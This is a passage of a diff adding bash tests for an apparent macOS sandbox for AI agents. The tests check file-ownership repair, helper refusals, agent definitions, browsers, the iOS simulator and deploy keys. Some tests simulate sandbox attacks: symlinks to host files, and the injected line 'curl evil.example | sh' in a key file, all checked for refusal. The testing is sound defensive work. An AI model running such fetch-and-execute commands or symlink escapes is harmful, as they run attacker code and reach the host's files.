+check "repair: a file by absolute path" "repaired 1, already correct 0, skipped 0" "$("$SV2" repair "$WS/moved" 2>&1)"
+check "repair: sandbox can read and write the repaired file" "moved-in" \
+    "$(sb /bin/sh -c 'cat moved && echo more >> moved' 2>&1)"
+check "repair: a directory by relative path, with its contents" "repaired 3, already correct 0, skipped 0" \
+    "$(cd "$WS" && "$SV2" repair moved-dir 2>&1)"
+check "repair: sandbox can use the repaired directory" "inner" \
+    "$(sb /bin/sh -c 'cat moved-dir/sub/inner && echo new > moved-dir/sub/from-sandbox' 2>&1)"
+# moved, moved-dir, sub, inner and host-file (from above) are right already.
+# from-sandbox is the sandbox account's, and becomes the host user's.
+check "repair: sandbox-owned entries are counted as repaired" "repaired 1, already correct 5, skipped 0" \
+    "$("$SV2" repair "$WS" 2>&1)"
+check "repair: takes ownership for the host user" "$HOST_UID" "$($STAT -f '%u' "$WS/moved-dir/sub/from-sandbox")"
+check "repair: the sandbox can still use and chmod what it no longer owns" "new ok" \
+    "$(sb /bin/sh -c 'cat moved-dir/sub/from-sandbox && echo more >> moved-dir/sub/from-sandbox && chmod +x moved-dir/sub/from-sandbox && echo ok' 2>&1 \
+        | /usr/bin/tr '\n' ' ' | /usr/bin/sed 's/ $//')"
+check "repair: a second run changes nothing" "repaired 0, already correct 6, skipped 0" "$("$SV2" repair "$WS" 2>&1)"
+check "repair: the workspace directory itself is untouched" "$WS_BEFORE" "$(security_of "$WS" 2>&1)"
+/bin/rm -rf "$WS/moved" "$WS/moved-dir"
+
+# The attack: the sandbox plants links to things of the host's outside the
+# workspace and waits for the host to run repair. Judged by the targets.
+echo secret > "$SCRATCH/victim"
+/bin/mkdir "$SCRATCH/victim-dir"
+VICTIMS_BEFORE="$(/bin/ls -lde "$SCRATCH" "$SCRATCH/victim" "$SCRATCH/victim-dir")"
+sb /bin/sh -c 'ln -s "$1/victim" link-file; ln -s "$1/victim-dir" link-dir; mkdir real; ln -s "$1" real/link-up' sv2 "$SCRATCH"
+if [[ -L "$WS/link-file" && -L "$WS/link-dir" && -L "$WS/real/link-up" ]]; then
+    pass "repair: precondition, the sandbox planted its links"
+else
+    fail "repair: precondition, the sandbox planted its links"
+fi
+"$SV2" repair "$WS" >/dev/null 2>&1 || true
+refused "repair: a link named directly is refused" "$SV2" repair "$WS/link-file"
+refused "repair: a path through a link is refused" "$SV2" repair "$WS/link-dir/x"
+refused "repair: a path through a nested link is refused" "$SV2" repair "$WS/real/link-up/victim"
+check "repair: nothing the links point to was changed" "$VICTIMS_BEFORE" \
+    "$(/bin/ls -lde "$SCRATCH" "$SCRATCH/victim" "$SCRATCH/victim-dir")"
+/bin/rm -rf "$WS/link-file" "$WS/link-dir" "$WS/real"
+
+refused "repair: a path outside any workspace is refused" "$SV2" repair /private/tmp
+refused "repair: the host home is refused" "$SV2" repair "$HOME"
+refused "repair: the directory above the workspace is refused" "$SV2" repair "/Users/sv2/$HOST_USER"
+refused "repair: '..' is refused" "$SV2" repair "$WS/../$P"
+refused "repair: a profile that does not exist is refused" "$SV2" repair "/Users/sv2/$HOST_USER/nosuchprofile"
+
+# What the sandbox account owns and the host has no way into: a file moved in
+# from the sandbox home, a tree whose ACLs are gone, and a directory closed
+# even to its owner. Only the account can open them, so repair has it do that.
+# (host-file, from above, is the entry that is correct already.)
+sb /bin/sh -c 'umask 077
+    echo moved > "$HOME/held-moved" && mv "$HOME/held-moved" held-moved
+    mkdir -p held-tree/sub held-closed/in && echo deep > held-tree/sub/deep && echo in > held-closed/in/file
+    chmod -R -N held-tree held-closed && chmod 000 held-closed/in held-closed'
+check "repair: precondition, the host cannot open what the sandbox holds" "" \
+    "$(/bin/cat "$WS/held-moved" "$WS/held-tree/sub/deep" "$WS/held-closed/in/file" 2>/dev/null || true)"
+check "repair: precondition, nor remove it" "held-closed held-tree" \
+    "$(/bin/rm -rf "$WS/held-tree" "$WS/held-closed" 2>/dev/null; /bin/ls "$WS" | /usr/bin/grep '^held-[ct]' | /usr/bin/tr '\n' ' ' | /usr/bin/sed 's/ $//')"
+check "repair: the sandbox account hands back what it holds" "repaired 7, already correct 1, skipped 0" \
+    "$("$SV2" repair "$WS" 2>&1)"
+check "repair: what was handed back is the host user's and readable" "$HOST_UID $HOST_UID $HOST_UID moved deep in" \
+    "$({ $STAT -f '%u' "$WS/held-moved" "$WS/held-tree/sub/deep" "$WS/held-closed/in"
+        /bin/cat "$WS/held-moved" "$WS/held-tree/sub/deep" "$WS/held-closed/in/file"; } 2>&1 \
+        | /usr/bin/tr '\n' ' ' | /usr/bin/sed 's/ $//')"
+check "repair: and the sandbox can still use it" "moved deep in" \
+    "$(sb /bin/sh -c 'cat held-moved held-tree/sub/deep held-closed/in/file' 2>&1 | /usr/bin/tr '\n' ' ' | /usr/bin/sed 's/ $//')"
+check "repair: a second run changes nothing after a hand-back" "repaired 0, already correct 8, skipped 0" \
+    "$("$SV2" repair "$WS" 2>&1)"
+/bin/rm -rf "$WS/held-moved" "$WS/held-tree" "$WS/held-closed"
+check "repair: the host can remove what was handed back" "host-file" "$(/bin/ls -A "$WS")"
+
+# What even its owner cannot change is reported, and the exit status says so.
+sb /bin/sh -c 'umask 077; echo mine > locked; chmod -N locked; chflags uchg locked'
+rc=0; OUT="$("$SV2" repair "$WS" 2>&1)" || rc=$?
+if [[ "$rc" -ne 0 && "$OUT" == *"skipped 1"* && "$OUT" == *locked* ]]; then
+    pass "repair: an entry it may not change is reported and fails the run"
+else
+    fail "repair: an entry it may not change is reported and fails the run" "rc=$rc $OUT"
+fi
+sb /bin/sh -c 'chflags nouchg locked'
+/bin/rm -f "$WS/locked"
+
+###############################################################################
+# the helper refuses what it must
+###############################################################################
+section "the helper refuses what it must"
+CALL=(/usr/bin/sudo -n -- "$HELPER" call "$VERSION")
+# sandbox-exec would read a leading -p as "use this profile instead".
+OUT="$("${CALL[@]}" launch "$P" -- -p '(version 1)(allow default)' /usr/bin/touch "/Users/Shared/$MARK" 2>&1 || true)"
+if [[ ! -e "/Users/Shared/$MARK" && "$OUT" == *"absolute path"* ]]; then
+    pass "helper: command cannot be a sandbox-exec option"
+else
+    fail "helper: command cannot be a sandbox-exec option" "$OUT"
+    /usr/bin/sudo -n -- "$HELPER" call "$VERSION" launch "$P" -- /bin/rm -f "/Users/Shared/$MARK" || true
+fi
+refused "helper: unknown profile" "${CALL[@]}" launch nosuchprofile -- /usr/bin/true
+refused "helper: invalid profile name" "${CALL[@]}" profile-add "../x"
+refused "helper: invalid profile name (dash)" "${CALL[@]}" profile-add "a-b"
+rc=0; /usr/bin/sudo -n -- "$HELPER" call "${VERSION/sshd=/sshd=9}" profile-list >/dev/null 2>&1 || rc=$?
+check "helper: one artifact version that differs is refused, with the reinstall status" "3" "$rc"
+refused "helper: the application version is not what it compares" \
+    /usr/bin/sudo -n -- "$HELPER" call "$APP_VERSION" profile-list
+refused "helper: not runnable without sudo" "$HELPER" call "$VERSION" profile-list
+refused "helper: admin verbs are not in call mode" "${CALL[@]}" uninstall
+refused "helper: stage2 is not in call mode" "${CALL[@]}" stage2 "$SB_UID" "$HOST_USER" "$P" -- /usr/bin/true
+refused "sandbox account: cannot reach the helper through sudo" sb /usr/bin/sudo -n -- "$HELPER" call "$VERSION" profile-list
+# The sudoers line covers call mode only. -k ignores a cached sudo password.
+# Skipped where the user has blanket passwordless sudo (CI runners).
+if /usr/bin/sudo -k -n /usr/bin/true 2>/dev/null; then
+    echo "     (blanket passwordless sudo: admin/stage2 password checks not applicable)"
+else
+    refused "sudoers: admin mode needs a password" \
+        /usr/bin/sudo -k -n -- "$HELPER" admin "$VERSION" user-deny sv2-no-such-user
+    refused "sudoers: stage2 needs a password" \
+        /usr/bin/sudo -k -n -- "$HELPER" stage2 "$SB_UID" "$HOST_USER" "$P" -- /usr/bin/true
+fi
+
+###############################################################################
+# agents
+###############################################################################
+section "agents"
+# Built-in definitions are found beside sv2, and are refused where a sandbox
+# could write them, which includes a checkout in /Users/Shared. So the suite
+# runs agents from a copy of the build in host-only scratch, laid out as an
+# installed prefix, with a definition of its own: nothing is downloaded and
+# no package is installed.
+PREFIX="$SCRATCH/prefix"
+/bin/mkdir -p "$PREFIX/bin" "$PREFIX/share/sandvault2/agents/sv2test"
+/bin/cp "$SV2" "$BUILT_HELPER" "$PREFIX/bin/"
+/bin/cat > "$PREFIX/share/sandvault2/agents/sv2test/agent.toml" <<'TOML'
+schema = 1
+
+# The host's install is nowhere and has no package; the sandbox's own is
+# made by the script below. The two are never mixed.
+[install.host]
+binary = ["/nonexistent/sv2test"]
+
+[install.guest]
+script = "install.sh"
+binary = ["~/.local/bin/sv2test"]
+
+[run]
+bypass_flag = "--sv2-test-flag"
+grants = "nothing; it is a test"
+no_inject = ["plain"]
+inject_last = ["after"]
+env = { TEST_VARIABLE_FOR_SV2 = 'a "quoted" value' }
+TOML
+/bin/cat > "$PREFIX/share/sandvault2/agents/sv2test/install.sh" <<'INSTALL'
+#!/bin/bash
+set -euo pipefail
+mkdir -p "$HOME/.local/bin"
+printf '#!/bin/sh\nprintf "%%s|" "$(id -un)" "$@"\ncase " $* " in *" showenv "*) printf "%%s|" "$TEST_VARIABLE_FOR_SV2";; esac\n' > "$HOME/.local/bin/sv2test"
+chmod +x "$HOME/.local/bin/sv2test"
+INSTALL
+agent() { "$PREFIX/bin/sv2" --profile "$P" "$@"; }
+
+if agent sv2test x >/dev/null 2>&1; then
+    fail "agent: one that is not installed does not run"
+else
+    pass "agent: one that is not installed does not run"
+fi
+check "agent: not installed without --native" "absent" \
+    "$(sb /bin/sh -c 'test -e ~/.local/bin/sv2test && echo present || echo absent')"
+check "agent: --native installs it in the sandbox home and runs it, as the sandbox account" \
+    "$ACCOUNT|--sv2-test-flag|a b|\$HOME|" "$(agent --native sv2test "a b" '$HOME' 2>/dev/null)"
+check "agent: --native again runs the copy that is there" "$ACCOUNT|--sv2-test-flag|again|" \
+    "$(agent --native sv2test again 2>/dev/null)"
+# The sandbox's own copy is a different install from the host's: without
+# --native it is not run in the host's place, whatever is in the sandbox.
+OUT="$(agent sv2test x 2>&1)" && RC=0 || RC=$?
+if [[ "$RC" -ne 0 && "$OUT" != *"$ACCOUNT|"* && "$OUT" == *"--native"* ]]; then
+    pass "agent: without --native the sandbox's own copy is not run, and the way to it is named"
+else
+    fail "agent: without --native the sandbox's own copy is not run, and the way to it is named" "rc=$RC: $OUT"
+fi
+check "agent: a listed subcommand does not get the flag" "$ACCOUNT|plain|x|" \
+    "$(agent --native sv2test plain x 2>/dev/null)"
+check "agent: a subcommand listed for it gets the flag after its arguments" \
+    "$ACCOUNT|after|x|--sv2-test-flag|" "$(agent --native sv2test after x 2>/dev/null)"
+check "agent: the definition's variable reaches the agent as written" \
+    "$ACCOUNT|--sv2-test-flag|showenv|a \"quoted\" value|" "$(agent --native sv2test showenv 2>/dev/null)"
+OUT="$(agent --native sv2test x 2>&1 >/dev/null)"
+if [[ "$OUT" == *"runs with --sv2-test-flag"* && "$OUT" == *"nothing; it is a test"* \
+    && "$OUT" == *"$PREFIX/share/sandvault2/agents/sv2test"* ]]; then
+    pass "agent: the banner names the flag and the definition"
+else
+    fail "agent: the banner names the flag and the definition" "$OUT"
+fi
+OUT="$(agent --native sv2test plain 2>&1 >/dev/null)"
+if [[ "$OUT" == *"--sv2-test-flag"* ]]; then
+    fail "agent: the banner does not claim a flag that was not given" "$OUT"
+else
+    pass "agent: the banner does not claim a flag that was not given"
+fi
+check "agent: the exit status is the agent's" "7" \
+    "$(sb /bin/sh -c 'printf "#!/bin/sh\nexit 7\n" > ~/.local/bin/sv2test'; agent --native sv2test >/dev/null 2>&1; echo $?)"
+
+###############################################################################
+# browsers
+###############################################################################
+section "browsers"
+# --lightpanda and --chrome: the launcher starts the browser in the sandbox,
+# the session finds it at SV_BROWSER_ENDPOINT, and nothing of it is left when
+# the session has ended. (That Chrome loads a page under the profile is the
+# probe "Google Chrome with a debugging port loads a page", above.)
+browser_session() { # OPTION WORD: a session with that browser, asked what answers at the endpoint
+    local option="$1" word="$2" answer n=0
+    # shellcheck disable=SC2016 # expanded in the session
+    answer="$("$SV2" --profile "$P" "$option" shell /bin/sh -c '/usr/bin/curl -s -m 10 "$SV_BROWSER_ENDPOINT/json/version"' 2>/dev/null || true)"
+    if [[ "$answer" == *"$word"* ]]; then
+        pass "browser: $option answers at SV_BROWSER_ENDPOINT in its session"
+    else
+        fail "browser: $option answers at SV_BROWSER_ENDPOINT in its session" "$answer"
+    fi
+    # The launcher's watcher looks once a second.
+    while /usr/bin/pgrep -u "$ACCOUNT" -f "sv2-browser|lightpanda serve" >/dev/null 2>&1 && [[ "$n" -lt 50 ]]; do
+        /bin/sleep 0.2
+        n=$((n + 1))
+    done
+    check "browser: $option is gone when its session has ended" "" \
+        "$(/usr/bin/pgrep -u "$ACCOUNT" -lf "sv2-browser|lightpanda serve" || true)"
+}
+LIGHTPANDA=""
+for BREW in /opt/homebrew /usr/local; do
+    [[ -x "$BREW/bin/brew" && -x "$BREW/bin/lightpanda" ]] && LIGHTPANDA="$BREW/bin/lightpanda" && break
+done
+if [[ -n "$LIGHTPANDA" ]]; then
+    browser_session --lightpanda Lightpanda
+else
+    echo "     skip browser: --lightpanda: Lightpanda is not installed"
+fi
+if [[ -x "/Applications/Google Chrome.app/Contents/MacOS/Google Chrome" ]]; then
+    browser_session --chrome Chrome
+else
+    echo "     skip browser: --chrome: no Google Chrome in /Applications"
+fi
+if "$SV2" --profile "$P" --chrome --lightpanda shell /usr/bin/true >/dev/null 2>&1; then
+    fail "browser: two browsers at once are refused"
+else
+    pass "browser: two browsers at once are refused"
+fi
+
+###############################################################################
+# iOS simulator
+###############################################################################
+section "iOS simulator"
+# --ios: the helper opens the simulator's services in the session's sandbox
+# profile, and the session runs a simulator itself, as the sandbox account.
+# Nothing of it runs as the host user.
+check "ios: a session without --ios has no simulator" "unset" \
+    "$(sb /bin/sh -c 'echo "${SV_IOS_SIMULATOR_UDID-unset}"')"
+if "${CALL[@]}" launch "$P" other -- /usr/bin/true >/dev/null 2>&1; then
+    fail "helper: only the word ios may stand before the command"
+else
+    pass "helper: only the word ios may stand before the command"
+fi
+check "helper: the word ios starts a session like any other" "$ACCOUNT" \
+    "$("${CALL[@]}" launch "$P" ios -- /usr/bin/id -un 2>&1)"
+
+# The rest needs Xcode and an iOS runtime, and takes a minute or two: the
+# session boots a simulator, installs and launches an app built here, and
+# the app reports what it is and what it can reach.
+ios_checks() {
+    local build="$SCRATCH/ios-build" victim="$SCRATCH/ios-victim" d="$WS/ios"
+    local sdk sv2_pid n=0
+    sdk="$(/usr/bin/xcrun --sdk iphonesimulator --show-sdk-path)"
+    /bin/mkdir -p "$build/Probe.app" "$victim" "$d"
+    /usr/bin/xcrun --sdk iphonesimulator clang -arch "$(/usr/bin/uname -m)" \
+        -isysroot "$sdk" -mios-simulator-version-min=16.0 -fobjc-arc \
+        -framework UIKit -framework Foundation \
+        "$TESTS_DIR/ios-probe/main.m" -o "$build/Probe.app/Probe"
+    /bin/cp "$TESTS_DIR/ios-probe/Info.plist" "$build/Probe.app/Info.plist"
+    /usr/bin/codesign -s - --force "$build/Probe.app" 2>/dev/null
+    /bin/cp -R "$build/Probe.app" "$d/Probe.app"
+
+    # Without the option the same tool reaches nothing.
+    check "ios: without --ios the simulator's services are closed" "closed" \
+        "$(sb /bin/sh -c '/usr/bin/xcrun simctl list devicetypes 2>/dev/null | /usr/bin/grep -q iPhone && echo open || echo closed')"
+
+    /bin/cat > "$d/session.sh" <<'SESSION'
+set -u
+D="$1"; VICTIM="$2"; HOST_HOME="$3"
+U="${SV_IOS_SIMULATOR_UDID:-}"
+S="/usr/bin/xcrun simctl"
+out() { echo "$1=$2" >> "$D/results"; }
+until_deadline() { [[ "$(/bin/date +%s)" -lt "$1" ]]; }
+# No command here waits longer than this. (alarm survives exec.)
+bounded() { /usr/bin/perl -e 'alarm shift; exec @ARGV' "$@"; }
+
+out account "$(/usr/bin/id -un)"
+[[ "$U" =~ ^[0-9A-F-]{36}$ ]] && out udid yes || out udid "no: $U"
+bounded 400 $S bootstatus "$U" -b > /dev/null 2>&1 && out booted yes || out booted no
+bounded 120 $S install "$U" "$D/Probe.app" > "$D/install.log" 2>&1 && out install yes || out install "no: $(/usr/bin/tail -1 "$D/install.log")"
+# The simulator says it has booted before it can launch anything.
+deadline=$(($(/bin/date +%s) + 90))
+until SIMCTL_CHILD_SV2_PROBE_REPORT="$D/report" SIMCTL_CHILD_SV2_PROBE_HOME="$HOST_HOME" \
+    SIMCTL_CHILD_SV2_PROBE_VICTIM="$VICTIM" \
+    bounded 60 $S launch "$U" com.sandvault.sv2test.probe > /dev/null 2>&1 \
+    || ! until_deadline "$deadline"; do /bin/sleep 3; done
+/bin/sleep 3
+[[ -s "$D/report" ]] && out launch yes || out launch no
+bounded 120 $S io "$U" screenshot "$D/screen.png" > /dev/null 2>&1
+out screenshot "$(/usr/bin/head -c 8 "$D/screen.png" 2>/dev/null | /usr/bin/xxd -p)"
+
+# iosef, when the launcher could install it in this home.
+I="$HOME/.local/bin/iosef"
+if [[ -x "$I" ]]; then
+    describe() { bounded 90 "$I" describe --device="$U" 2>/dev/null || true; }
+    deadline=$(($(/bin/date +%s) + 150))
+    until tree="$(describe)"; [[ "$tree" == *"Hello from sv2 probe"* ]] || ! until_deadline "$deadline"; do /bin/sleep 2; done
+    [[ "$tree" == *"Hello from sv2 probe"* && "$tree" == *"Press me"* ]] && out describe yes || out describe "no: ${tree:0:200}"
+    bounded 60 "$I" tap --device="$U" --name="Press me" > /dev/null 2>&1 && out tap yes || out tap no
+    deadline=$(($(/bin/date +%s) + 60))
+    until tree="$(describe)"; [[ "$tree" == *"Pressed"* ]] || ! until_deadline "$deadline"; do /bin/sleep 2; done
+    [[ "$tree" == *"Pressed"* ]] && out pressed yes || out pressed no
+else
+    out iosef missing
+fi
+
+echo "$U" > "$D/for-host"
+n=0
+until [[ -e "$D/host-done" || "$n" -ge 120 ]]; do /bin/sleep 1; n=$((n + 1)); done
+SESSION
+
+    "$SV2" --profile "$P" --ios shell /bin/bash "$d/session.sh" "$d" "$victim" "$HOME" \
+        < /dev/null > "$SCRATCH/ios-session.log" 2>&1 &
+    sv2_pid=$!
+    # Booting takes most of this; the session gives up on its own.
+    while /bin/kill -0 "$sv2_pid" 2>/dev/null && [[ ! -s "$d/for-host" && "$n" -lt 900 ]]; do
+        /bin/sleep 1
+        n=$((n + 1))
+    done
+    result() { /usr/bin/sed -n "s/^$1=//p" "$d/results" 2>/dev/null; }
+    report() { /usr/bin/sed -n "s/^$1=//p" "$d/report" 2>/dev/null; }
+    if [[ ! -s "$d/for-host" ]]; then
+        fail "ios: the session has a simulator" "$(/usr/bin/tail -5 "$SCRATCH/ios-session.log")"
+    else
+        pass "ios: the session has a simulator"
+        # From the host, while the session waits: whose process the app is.
+        check "ios: the app in the simulator runs as the sandbox account" "$ACCOUNT" \
+            "$(/bin/ps -axww -o user=,command= | /usr/bin/awk '/Probe\.app\/Probe$/ {print $1}' | /usr/bin/sort -u)"
+        check "ios: nothing of it is a simulator of the host user's" "" \
+            "$(/usr/bin/xcrun simctl list devices | /usr/bin/grep 'sv2-ios-' || true)"
+    fi
+    : > "$d/host-done"
+    wait "$sv2_pid" || true
+
+    check "ios: the session is the sandbox account's" "$ACCOUNT" "$(result account)"
+    check "ios: the launcher gives it a simulator" "yes" "$(result udid)"
+    check "ios: the simulator boots, with no window" "yes" "$(result booted)"
+    check "ios: install" "yes" "$(result install)"
+    check "ios: launch" "yes" "$(result launch)"
+    check "ios: a screenshot, as a PNG" "89504e470d0a1a0a" "$(result screenshot)"
+    if [[ "$(result iosef)" == "missing" ]]; then
+        echo "     skip ios: describe and tap: iosef is not in the sandbox home (no uv from Homebrew to install it with)"
+    else
+        check "ios: iosef describes the app" "yes" "$(result describe)"
+        check "ios: iosef taps" "yes" "$(result tap)"
+        check "ios: the tap reached the app" "yes" "$(result pressed)"
+    fi
+    # What --ios grants, measured: the app is outside the sandbox profile
+    # but is the sandbox account, which the host's files are closed to.
+    check "ios: the app's own word for who it is" "uid=$SB_UID" "uid=$(report uid)"
+    check "ios: the app cannot list the host home" "no" "$(report list-home)"
+    check "ios: the app cannot list a directory of the host's" "no" "$(report list-victim)"
+    check "ios: the app cannot write there (its word)" "no" "$(report write-victim)"
+    check "ios: the app did not write there (the host's look)" "" "$(/bin/ls -A "$victim")"
+    # The launcher's watcher shuts the simulator down and deletes it.
+    n=0
+    while /usr/bin/pgrep -u "$ACCOUNT" -f launchd_sim >/dev/null 2>&1 && [[ "$n" -lt 60 ]]; do
+        /bin/sleep 1
+        n=$((n + 1))
+    done
+    check "ios: the simulator is shut down when the session has ended" "" \
+        "$(/usr/bin/pgrep -u "$ACCOUNT" -lf launchd_sim || true)"
+    # Only its own: CoreSimulator makes an account a set of devices of its
+    # own the first time it is asked.
+    check "ios: and deleted" "gone" \
+        "$(sb /bin/sh -c 'test -e "$HOME/Library/Developer/CoreSimulator/Devices/$1" && echo there || echo gone' sh "$(/bin/cat "$d/for-host" 2>/dev/null || echo none)" 2>&1)"
+    /bin/rm -rf "$d"
+}
+if ! /usr/bin/xcrun --find simctl >/dev/null 2>&1; then
+    echo "     skip ios: a simulator in a session: no Xcode (simctl)"
+elif ! /usr/bin/xcrun simctl list runtimes 2>/dev/null | /usr/bin/grep -q '^iOS'; then
+    echo "     skip ios: a simulator in a session: no iOS simulator runtime"
+else
+    ios_checks
+fi
+
+###############################################################################
+# credentials
+###############################################################################
+section "credentials"
+# A deploy key: made in the sandbox, read back as a public key and nothing
+# else, and offered to the user in a command that names the repository the
+# user asked for and a file the sandbox cannot write. (No key is added to any
+# repository, and nothing here uses the network.)
+KEY_COPY="$HOME/.local/state/sandvault2/deploy-keys/$P/sv2-test-owner--sv2-test-repo.pub"
+OUT="$("$SV2" deploy-key --profile "$P" sv2-test-owner/sv2-test-repo 2>&1)" && RC=0 || RC=$?
+check "deploy-key: succeeds" "0" "$RC"
+if [[ "$OUT" == *"gh repo deploy-key add $KEY_COPY --repo sv2-test-owner/sv2-test-repo --title 'sv2 $ACCOUNT'"* \
+    && "$OUT" != *"--allow-write"* ]]; then
+    pass "deploy-key: prints the command, read-only, for the repository asked for"
+else
+    fail "deploy-key: prints the command, read-only, for the repository asked for" "$OUT"
+fi
+check "deploy-key: the host's copy is the sandbox's public key, without its comment" \
+    "$(sb /bin/sh -c 'cut -d" " -f1,2 ~/.ssh/sv2-deploy-keys/sv2-test-owner--sv2-test-repo.pub')" \
+    "$(/bin/cat "$KEY_COPY" 2>/dev/null)"
+check "deploy-key: the private key stays in the sandbox home, for its owner only" "600 $SB_UID" \
+    "$(sb /usr/bin/stat -f '%Lp %u' "/Users/$ACCOUNT/.ssh/sv2-deploy-keys/sv2-test-owner--sv2-test-repo")"
+# git is told which ssh to use by the session's environment; the user's own
+# git and ssh configuration are not written to.
+check "deploy-key: later sessions point git at the key-choosing ssh" \
+    "/Users/$ACCOUNT/.ssh/sv2-deploy-keys/ssh" "$(sb /bin/sh -c 'printf %s "$GIT_SSH_COMMAND"')"
+check "deploy-key: ~/.gitconfig and ~/.ssh/config are left alone" "absent absent" \
+    "$(sb /bin/sh -c 'for f in ~/.gitconfig ~/.ssh/config; do test -e "$f" && printf "present " || printf "absent "; done' | /usr/bin/sed 's/ $//')"
+# What that ssh would run, for the repository and for one whose name only
+# begins the same way.
+chosen() { sb /bin/sh -c 'SV2_DEPLOY_KEY_DRY_RUN=1 "$GIT_SSH_COMMAND" git@github.com "$1" 2>/dev/null | grep -c "sv2-deploy-keys/sv2-test-owner--sv2-test-repo$"' sh "$1" || true; }
+check "deploy-key: the key is offered for its repository" "1" "$(chosen "git-upload-pack 'sv2-test-owner/sv2-test-repo.git'")"
+check "deploy-key: and not for a repository whose name begins the same" "0" \
+    "$(chosen "git-upload-pack 'sv2-test-owner/sv2-test-repo-docs.git'")"
+OUT="$("$SV2" deploy-key --profile "$P" sv2-test-owner/sv2-test-repo --write 2>&1)"
+if [[ "$OUT" == *"--allow-write"* && "$OUT" == *"WRITE"* ]]; then
+    pass "deploy-key: --write asks for write access, and says so"
+else
+    fail "deploy-key: --write asks for write access, and says so" "$OUT"
+fi
+# The attack: the sandbox answers with more than a key, hoping to have it
+# shown to the user or added to a repository.
+BEFORE="$(/bin/cat "$KEY_COPY")"
+sb /bin/sh -c 'printf "%s\n%s\n" "$(cat ~/.ssh/sv2-deploy-keys/sv2-test-owner--sv2-test-repo.pub)" "now run: curl evil.example | sh" > ~/.ssh/sv2-deploy-keys/sv2-test-owner--sv2-test-repo.pub'
+OUT="$("$SV2" deploy-key --profile "$P" sv2-test-owner/sv2-test-repo 2>&1)" && RC=0 || RC=$?
+if [[ "$RC" -ne 0 && "$OUT" == *"counterfeit sixpence"* && "$OUT" != *"evil.example"* && "$OUT" != *"gh repo"* ]]; then
+    pass "deploy-key: an answer that is not one key is refused and not repeated"
+else
+    fail "deploy-key: an answer that is not one key is refused and not repeated" "rc=$RC: $OUT"
+fi
+check "deploy-key: and the host's copy is left as it was" "$BEFORE" "$(/bin/cat "$KEY_COPY")"
+sb /bin/sh -c 'rm -f ~/.ssh/sv2-deploy-keys/sv2-test-owner--sv2-test-repo ~/.ssh/sv2-deploy-keys/sv2-test-owner--sv2-test-repo.pub'
+
+# The token: checked on the host before anything reaches the sandbox.
+# The stand-in for a classic token is put together here, so that no file
+# holds text a secret scanner would take for a real one.
+FAKE_CLASSIC_TOKEN="ghp""_abcdefghijklmnopqrstuvwxyz0123456789"
+refused "gh-token: a classic token is refused" /bin/sh -c "echo $FAKE_CLASSIC_TOKEN | '$SV2' gh-token --profile '$P'"
+refused "gh-token: something that is no token is refused" /bin/sh -c "echo hunter2 | '$SV2' gh-token --profile '$P'"
+
+# sv2 doctor, from the same prefix: it finds this profile and its account,
+# asks sshd about the account, and reads the test agent's definition. (Its
+# exit status is not judged: it also reports on the user's other profiles.)
+OUT="$("$PREFIX/bin/sv2" doctor 2>&1 || true)"
+for want in "ok      installed, and the helper matches this sv2" \
+    "ok      profile '$P' ($ACCOUNT)" \
+    "ok      sshd refuses a login as $ACCOUNT" \
+    "ok      profile '$P' cannot connect to this Mac's SSH port" \
+    "note    agent 'sv2test' is not installed on this Mac"; do
+    if [[ "$OUT" == *"$want"* ]]; then
+        pass "doctor: ${want#* }"
+    else
+        fail "doctor: ${want#* }" "$OUT"
+    fi
+done
+
+# The attack: a definition where the sandbox can write it. It names what sv2
+# installs with Homebrew as the host user, so the sandbox would choose code
+# that runs on the host. Here the whole prefix is in the workspace.
+/bin/cp -R "$PREFIX" "$WS/prefix"
+OUT="$("$WS/prefix/bin/sv2" --profile "$P" sv2test x 2>&1)" && RC=0 || RC=$?
+if [[ "$RC" -ne 0 && "$OUT" == *"refusing the agent definition"* && "$OUT" != *"$ACCOUNT|"* ]]; then
+    pass "agent: a definition inside the workspace is refused"
+else
+    fail "agent: a definition inside the workspace is refused" "$OUT"
+fi
+/bin/rm -rf "$WS/prefix"
+
+# ^Z. Suspended with the registry lock held, the helper would keep every
+# other user's sv2 waiting, so it ignores the terminal's stop signals; a
+# session must still be suspendable.
+#
+# job_control LINE PATTERN TENTHS: an interactive bash on a fresh pty runs
+# LINE; once a process matching PATTERN is running, ^Z is typed ten times;
+# when that process has gone, or after TENTHS of a second, the shell says how
+# many jobs it has. Interactive, because only a shell with job
+# control makes ^Z mean anything: a stop signal from the keyboard is
+# discarded for a process group nobody would resume. And only once the
+# process is there: typed earlier, ^Z reaches sv2 or sudo before the helper has
+# started, which holds nobody up and is not what is being tested. (Measured:
+# typed while sudo is still setting up, it can leave sudo waiting for good.
+# The patterns below therefore match the helper itself, from the start of its
+# command line, and not the sudo that names it in its arguments.)
+job_control() {
+    local out="$SCRATCH/job-control.out" waited=0
+    # The rcfile does not exist; its path marks the process for the watchdog.
+    {
+        local n=0
+        /bin/sleep 0.5
+        printf '%s\n' "$1"
+        until /usr/bin/pgrep -f "$2" >/dev/null || [[ "$n" -ge 200 ]]; do
+            /bin/sleep 0.02
+            n=$((n + 1))
+        done
+        # And only once sudo has put the shell's terminal in raw mode, so that
+        # ^Z goes to the pty sudo made for the command. sudo does that after
+        # the command has started, which is after the pattern can match; in
+        # between, ^Z still stops sv2 and sudo, and the job shows "Stopped"
+        # (seen on CI). The terminal is the interactive shell's.
+        local tty
+        tty="$(/bin/ps -o tty= -p "$(/usr/bin/pgrep -f "^/bin/bash --noprofile --rcfile $SCRATCH/no-rcfile" | /usr/bin/head -n 1)" 2>/dev/null | /usr/bin/tr -d ' ')"
+        n=0
+        until [[ -z "$tty" || "$n" -ge 100 ]] \
+            || /bin/stty -f "/dev/$tty" -a 2>/dev/null | /usr/bin/grep -qw -- '-isig'; do
+            /bin/sleep 0.02
+            n=$((n + 1))
+        done
+        for _ in 1 2 3 4 5 6 7 8 9 10; do printf '\032'; /bin/sleep 0.03; done
+        # Nothing more is typed until the process is gone, or stays stopped:
+        # sudo passes what is typed on to the command, which would swallow
+        # the lines below.
+        n=0
+        while /usr/bin/pgrep -f "$2" >/dev/null && [[ "$n" -lt "$3" ]]; do
+            /bin/sleep 0.1
+            n=$((n + 1))
+        done
+        /bin/sleep 0.5
+        printf 'echo "jobs=$(jobs | /usr/bin/wc -l | /usr/bin/tr -d " ")"\n'
+        /bin/sleep 0.5
+        # Twice: bash declines the first exit while a job is stopped.
+        printf 'kill %%1 2>/dev/null; exit\nexit\n'
+        /bin/sleep 3
+    } | SV2="$SV2" P="$P" P2="$P2" PS1='$ ' /usr/bin/script -q /dev/null \
+        /bin/bash --noprofile --rcfile "$SCRATCH/no-rcfile" -i > "$out" 2>&1 &
